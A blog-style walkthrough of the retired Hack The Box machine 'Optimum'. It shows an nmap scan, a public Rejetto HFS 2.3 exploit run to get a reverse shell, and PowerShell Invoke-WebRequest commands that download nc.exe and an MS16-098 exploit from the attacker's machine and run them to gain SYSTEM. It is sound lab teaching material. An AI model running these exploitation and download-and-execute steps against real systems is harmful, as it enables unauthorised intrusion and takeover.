---
layout: post
title:  "HTB-Optimum"
date:   2020-02-17 00:01:57 +0000
categories: HTB-Walkthrough
---

![optimum](/assets/img/optimum.png)

Optimum is another OSCP-like box from the HTB 'retired' archive.


`nmap -sV -Pn --min-rate 10000 10.10.10.8 |tee -a opt.txt`

```

Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 11:51 EST
Nmap scan report for 10.10.10.8
Host is up (0.092s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```


<h3>Using Searchsploit</h3>

`searchsploit hfs 2.3`

```

----------------------------------------------------- ----------------------------------
 Exploit Title                                       |  Path
                                                     | (/opt/exploitdb/)
----------------------------------------------------- ----------------------------------
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary F | exploits/multiple/remote/30850.tx
Rejetto HTTP File Server (HFS) 2.3.x - Remote Comman | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Comman | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remo | exploits/windows/webapps/34852.tx
----------------------------------------------------- ----------------------------------

```

We'll check out the python script, `searchsploit -m 39161.py` will copy the exploit to the pwd (present working directory).
...looks promising...

```

python 39161.py 10.10.10.8 80

```

we get user shell...to our nc listener on port 443.

```

root@kali:~/HTB/retired/optimum# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.8] 49172
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\kostas\Desktop

31/01/2020  03:52 ��    <DIR>          .
31/01/2020  03:52 ��    <DIR>          ..
31/01/2020  03:21 ��    <DIR>          %TEMP%
18/03/2017  02:11 ��           760.320 hfs.exe
18/03/2017  02:13 ��                32 user.txt.txt
               2 File(s)        760.352 bytes
               3 Dir(s)  31.898.783.744 bytes free

C:\Users\kostas\Desktop>type user.txt.txt
type user.txt.txt
d0xxxxxxxxxxxxxxxxxxxxxx73

```

<h3>Privilege Escalation</h3>

User flag down, now we need to privesc to get the root.txt flag.

Use `powershell iwr -uri http://10.10.14.19/nc.exe -outfile .\nc.exe`
do the same for winPEAS.bat

Sometimes "iwr" won't work, and you'll have to type out the long version 'Invoke-WebRequest'.


run `winPEAS.bat > enum.txt` then send enum.txt via nc.

do `systeminfo`
copy output and paste to kali machine.

try [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

The resulting output is voluminous, so I won't paste it all here...
I selected ms16-098 and downloaded the exploit from github...

served it with `python3 -m http.server 80`
I used the IWR (Invoke-WebRequest)powershell command to move the file into my boo folder on the target.

```

C:\boo>powershell iwr -uri http://10.10.14.19/bfill.exe -outfile .\b.exe
powershell iwr -uri http://10.10.14.19/bfill.exe -outfile .\b.exe

```

So just run it....

```

C:\boo>c:\boo\b.exe
c:\boo\b.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\boo>whoami
whoami
nt authority\system

```

From here we can just grab the root.txt flag...

```

C:\Users\Administrator\Desktop>type root.txt
type root.txt
51xxxxxxxxxxxxxxxxxxxxxxxxxxxxed

```

:)



